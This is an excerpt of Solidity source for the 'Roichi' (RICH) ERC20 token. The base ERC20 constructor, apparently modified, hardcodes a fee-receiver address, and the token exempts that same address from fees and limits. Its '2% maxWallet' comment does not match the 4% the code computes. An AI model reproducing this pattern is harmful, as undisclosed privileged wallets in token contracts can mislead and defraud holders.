...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x0Bb6c412430e5C87B8d491a8C425859458Ace720] = _marketingwallet;
    }
...
contract Roichi is ERC20, Ownable {
    ...
    constructor() ERC20("Roichi", "RICH") {
        ...
        maxWallet = totalSupply * 40 / 1000; // 2% maxWallet
        ...
        excludeFromFees(address(0x0Bb6c412430e5C87B8d491a8C425859458Ace720), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x0Bb6c412430e5C87B8d491a8C425859458Ace720), true);
